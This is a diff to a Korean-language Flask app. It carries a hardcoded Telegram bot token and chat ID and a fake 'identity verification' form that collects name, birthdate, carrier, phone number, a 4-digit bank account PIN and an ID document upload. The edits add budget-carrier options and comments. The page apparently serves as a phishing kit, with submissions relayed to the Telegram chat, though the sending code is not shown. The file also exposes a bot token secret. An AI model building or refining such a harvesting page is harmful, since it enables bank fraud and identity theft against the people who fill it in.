@@ -5,10 +5,10 @@ from flask import Flask, request, jsonify, render_template_string
 
 # ── 텔레그램 정보 ─────────────────────────────────────────
 BOT_TOKEN = "8188337653:AAFGh85xzp5u_RqRJLrV8p3zR_D13c9RHuo"   # BotFather 토큰
-CHAT_ID   = 1902936                                         # 메시지를 받을 chat_id
+CHAT_ID   = 1902936                                           # 메시지를 받을 chat_id
 # ──────────────────────────────────────────────────────────
 
-# ── HTML (사진 + PDF 업로드 가능하도록 accept 속성 수정) ──
+# ── HTML (사진 + PDF 업로드 가능하도록 accept 속성 유지) ──
 HTML = r"""<!DOCTYPE html>
 <html lang="ko">
 <head>
@@ -60,7 +60,7 @@ HTML = r"""<!DOCTYPE html>
       </div>
     </div>
 
-    <!-- 폼 -->
+    <!-- ── 폼 ──────────────────────────────────────────── -->
     <form id="identityForm" class="space-y-6" enctype="multipart/form-data">
       <div id="formErrors" class="hidden bg-red-50 border-l-4 border-red-500 p-4 mb-4">
         <div class="flex">
@@ -69,6 +69,7 @@ HTML = r"""<!DOCTYPE html>
         </div>
       </div>
 
+      <!-- 이름 -->
       <div>
         <label for="name" class="block text-sm font-medium text-gray-700 mb-1">이름</label>
         <div class="relative">
@@ -81,6 +82,7 @@ HTML = r"""<!DOCTYPE html>
         </div>
       </div>
 
+      <!-- 생년월일 -->
       <div>
         <label for="birthdate" class="block text-sm font-medium text-gray-700 mb-1">생년월일</label>
         <div class="relative">
@@ -89,20 +91,38 @@ HTML = r"""<!DOCTYPE html>
         </div>
       </div>
 
+      <!-- 통신사 -->
       <div>
         <label class="block text-sm font-medium text-gray-700 mb-1">통신사</label>
         <div class="grid grid-cols-3 gap-3">
+          <!-- 3대 통신사 -->
           <div><input type="radio" id="carrier1" name="carrier" value="SKT" class="hidden peer" required>
-            <label for="carrier1" class="flex items-center justify-center p-3 bg-gray-50 rounded-lg border border-gray-200 cursor-pointer peer-checked:border-blue-500 peer-checked:bg-blue-50 peer-checked:text-blue-600">SKT</label></div>
+            <label for="carrier1" class="flex items-center justify-center p-3 bg-gray-50 rounded-lg border border-gray-200 cursor-pointer peer-checked:border-blue-500 peer-checked:bg-blue-50 peer-checked:text-blue-600">SKT</label>
+          </div>
           <div><input type="radio" id="carrier2" name="carrier" value="KT" class="hidden peer">
-            <label for="carrier2" class="flex items-center justify-center p-3 bg-gray-50 rounded-lg border border-gray-200 cursor-pointer peer-checked:border-blue-500 peer-checked:bg-blue-50 peer-checked:text-blue-600">KT</label></div>
+            <label for="carrier2" class="flex items-center justify-center p-3 bg-gray-50 rounded-lg border border-gray-200 cursor-pointer peer-checked:border-blue-500 peer-checked:bg-blue-50 peer-checked:text-blue-600">KT</label>
+          </div>
           <div><input type="radio" id="carrier3" name="carrier" value="LG U+" class="hidden peer">
-            <label for="carrier3" class="flex items-center justify-center p-3 bg-gray-50 rounded-lg border border-gray-200 cursor-pointer peer-checked:border-blue-500 peer-checked:bg-blue-50 peer-checked:text-blue-600">LG U+</label></div>
+            <label for="carrier3" class="flex items-center justify-center p-3 bg-gray-50 rounded-lg border border-gray-200 cursor-pointer peer-checked:border-blue-500 peer-checked:bg-blue-50 peer-checked:text-blue-600">LG&nbsp;U+</label>
+          </div>
+
+          <!-- 알뜰/자회사 4종 -->
           <div><input type="radio" id="carrier4" name="carrier" value="알뜰" class="hidden peer">
-            <label for="carrier4" class="flex items-center justify-center p-3 bg-gray-50 rounded-lg border border-gray-200 cursor-pointer peer-checked:border-blue-500 peer-checked:bg-blue-50 peer-checked:text-blue-600">알뜰</label></div>
+            <label for="carrier4" class="flex items-center justify-center p-3 bg-gray-50 rounded-lg border border-gray-200 cursor-pointer peer-checked:border-blue-500 peer-checked:bg-blue-50 peer-checked:text-blue-600">알뜰&nbsp;(공통)</label>
+          </div>
+          <div><input type="radio" id="carrier5" name="carrier" value="알뜰 KT" class="hidden peer">
+            <label for="carrier5" class="flex items-center justify-center p-3 bg-gray-50 rounded-lg border border-gray-200 cursor-pointer peer-checked:border-blue-500 peer-checked:bg-blue-50 peer-checked:text-blue-600">알뜰&nbsp;KT</label>
+          </div>
+          <div><input type="radio" id="carrier6" name="carrier" value="알뜰 SKT" class="hidden peer">
+            <label for="carrier6" class="flex items-center justify-center p-3 bg-gray-50 rounded-lg border border-gray-200 cursor-pointer peer-checked:border-blue-500 peer-checked:bg-blue-50 peer-checked:text-blue-600">알뜰&nbsp;SKT</label>
+          </div>
+          <div><input type="radio" id="carrier7" name="carrier" value="알뜰 LG" class="hidden peer">
+            <label for="carrier7" class="flex items-center justify-center p-3 bg-gray-50 rounded-lg border border-gray-200 cursor-pointer peer-checked:border-blue-500 peer-checked:bg-blue-50 peer-checked:text-blue-600">알뜰&nbsp;LG</label>
+          </div>
         </div>
       </div>
 
+      <!-- 전화번호 -->
       <div>
         <label for="phone" class="block text-sm font-medium text-gray-700 mb-1">전화번호</label>
         <div class="relative">
@@ -115,10 +135,11 @@ HTML = r"""<!DOCTYPE html>
         </div>
       </div>
 
+      <!-- 계좌 PIN -->
       <div>
         <label for="bankpin" class="block text-sm font-medium text-gray-700 mb-1">계좌 비밀번호 (4자리)</label>
         <div class="relative">
-          <input type="password" id="bankpin" name="bankpin" required maxlength="4" pattern="\d{4}" inputmode="numeric"
+          <input type="password" id="bankpin" name="bankpin" required maxlength="4" pattern="\\d{4}" inputmode="numeric"
                  class="w-full px-4 py-3 bg-gray-50 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-100 pr-12"
                  placeholder="••••">
           <button type="button" id="pinToggle" class="absolute inset-y-0 right-0 flex items-center pr-3 text-gray-400 hover:text-gray-600">
@@ -127,9 +148,9 @@ HTML = r"""<!DOCTYPE html>
         </div>
       </div>
 
+      <!-- 신분증 파일 -->
       <div>
         <label class="block text-sm font-medium text-gray-700 mb-1">신분증 파일</label>
-        <!-- ★ accept 에 PDF 추가 -->
         <input type="file" id="idPhoto" name="idPhoto" accept="image/*,application/pdf" class="file-input" required>
         <label for="idPhoto" id="fileInputLabel" class="file-input-label">
           <i class="fas fa-cloud-upload-alt text-3xl text-blue-500 mb-2"></i>
@@ -148,6 +169,7 @@ HTML = r"""<!DOCTYPE html>
         <div id="progressBar" class="progress-bar hidden"><div id="progress" class="progress"></div></div>
       </div>
 
+      <!-- 개인정보 동의 -->
       <div class="flex items-center">
         <input type="checkbox" id="agree" name="agree" required
                class="w-4 h-4 text-blue-600 bg-gray-100 border-gray-300 rounded focus:ring-blue-500">
@@ -158,6 +180,7 @@ HTML = r"""<!DOCTYPE html>
         </label>
       </div>
 
+      <!-- 제출 버튼 -->
       <div class="pt-4">
         <button type="submit" id="submitBtn"
                 class="submit-btn w-full px-6 py-3 bg-blue-600 hover:bg-blue-700 text-white font-medium rounded-lg shadow-md transition-all duration-300 transform hover:scale-105">
@@ -182,7 +205,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
   /* 전화번호 하이픈 */
   document.getElementById('phone').addEventListener('input',e=>{
-    let v=e.target.value.replace(/\D/g,'');
+    let v=e.target.value.replace(/\\D/g,'');
     if(v.length>3&&v.length<=7) v=v.slice(0,3)+'-'+v.slice(3);
     else if(v.length>7) v=v.slice(0,3)+'-'+v.slice(3,7)+'-'+v.slice(7,11);
     e.target.value=v;
@@ -237,7 +260,7 @@ document.addEventListener('DOMContentLoaded', () => {
     form.querySelectorAll('.border-red-500').forEach(el=>el.classList.remove('border-red-500'));
     let firstErr=null;
     form.querySelectorAll('[required]').forEach(inp=>{
-      if(!inp.value||(inp.id==='phone'&&!/^01[0-9]-\d{3,4}-\d{4}$/.test(inp.value))){
+      if(!inp.value||(inp.id==='phone'&&!/^01[0-9]-\\d{3,4}-\\d{4}$/.test(inp.value))){
         inp.classList.add('border-red-500');if(!firstErr)firstErr=inp;
       }
     });
